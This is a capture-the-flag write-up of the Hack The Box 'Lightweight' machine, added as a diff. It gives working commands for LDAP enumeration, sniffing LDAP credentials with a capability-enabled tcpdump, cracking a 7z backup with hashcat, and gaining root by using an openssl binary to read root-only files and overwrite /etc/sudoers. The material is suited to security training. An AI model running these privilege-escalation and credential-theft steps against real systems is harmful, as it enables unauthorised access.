@@ -1,0 +1,126 @@
+HTB-Lightweight-Writeup
+
+IP : 10.10.10.119
+
+Nmap
+----
+- nmap showed 3 open ports 
+	- 22 running SSH
+	- 80 running Apache httpd 2.4.6
+	- 389 running LDAP
+
+Enumeration
+-----------
+- we check port 80 and found a demo page for slendr
+- there are three pages mentioned in the root page 
+	- info.php
+	- status.php
+	- user.php
+
+- on visiting these pages we get info on how to deal with this box 
+- info.php tells us that if we ever try to brute force our way into the box we will get banned for 5 minutes
+- user.php page gives us a way to SSH into the box
+		creds : 10.10.14.17 : 10.10.14.17
+
+- within one minute of the first http request the account will be added, there might be a cronjob running very minute doing this 
+- status.php just gives a list of banned ips
+- up next we can try enumerating LDAP
+- use ldapsearch to enumerate LDAP
+
+	ldapsearch -x -h 10.10.10.119 -s base namingcontexts
+	ldapsearch -h 10.10.10.119 -p 389 -x -b dc=lightweight,dc=htb
+
+- we found some possible credentials 
+	
+	Username: ldapuser1
+	Password: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
+
+	Username: ldapuser2
+	Password: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
+
+- we base64 decode the password string and we get
+
+	{crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
+
+	{crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
+
+- identified the hash format as SHA512
+- we tried to crack the hash with hashcat but failed 
+- for further enumeration we can try to ssh into the box with the credentials we found before  
+
+	ssh 10.10.14.17@10.10.10.119
+
+- nothing much to work with in here but we can check out /etc/passwd file 
+- we found 2 users ldapuser1 and ldapuser2
+- we can run LinEnum on the box
+- we found files with POSIX capabilities set
+- capabilities in linux is used to allow binaries executed by non root users to perform privileged operations without providing them all root permission 
+- notice that the binary tcpdump has cap_net_admin,cap_net_raw+ep capabilities enabled.
+- which means that we can capture packets with root privileges 
+- we can run tcpdump and save the output 
+
+	 tcpdump -i lo port 389 -w capture.cap -v
+
+- transfer the capture.cap file onto our machine 
+
+	scp 10.10.14.17@10.10.10.119:/home/10.10.14.17/capture.cap capture.cap
+
+- we can open this file with wireshark and on inspecting the interactions we get credentials for ldapuser2
+
+	creds : ldapuser2 : 8bc8251332abe1d7f105d3e53ad39ac2
+
+- we can go back to our SSH session and switch user to ldapuser2 with this password 
+
+	su ldapuser2
+
+- we have the shell as ldapuser2 
+- grab the user flag 
+
+shell as ldapuser1
+------------------
+- there is a file called backup.7z in the home directory of the ldapuser2 
+- transfer the file to attacking machine 
+- when we try to open it, it asks for a password 
+- we can use 7z2john to generate a hash for the file and crack it using hashcat
+
+	7z2john backup.7z > backup.hash
+	hashcat -m 11600 -a 0 -o backup.cracked backup.hash /usr/share/wordlists/rockyou.txt --force
+
+- now we can see the contents of the zip file which is a backup for the web directories 
+- on checking those we found credentials for ldapuser1 in status.php
+
+	creds : ldapuser1 : f3ca9d298a553da117442deeb6fa932d
+
+- we can switch user with this password to get a shell as ldapuser1 
+
+Priv-esc
+--------
+- on checking the files inside ldapuser1 home directory we have tcpdump and openssl
+- on checking the capabilities for tcpdump and openssl, we see that openssl has =ep capabilities
+- the =ep capabilities means that the binary has all the capabilities 
+- hence the openssl binary is useful to us 
+- we can read the root flag with openssl
+
+	./openssl base64 -in /root/root.txt | base64 -d
+
+Shell as root
+-------------
+- we can edit /etc/sudoers file to get a shell as root
+- get a copy of the /etc/sudoers file
+
+	./openssl base64 -in /etc/sudoers | base64 -d > /dev/shm/t
+
+- add a line to allow the current user to run all commands with root permission 
+
+	echo "ldapuser1    ALL=(ALL)       ALL" >> /dev/shm/t
+
+- replace the /etc/sudoers file in the victim machine with the edited one 
+
+	cat /dev/shm/t | base64 | ./openssl enc -d -base64 -out /etc/sudoers
+
+- since we have an entry in the /etc/sudoers file we can run sudo su to change into root 
+
+	sudo su
+
+- we get a shell as root
+- grab the root flag  
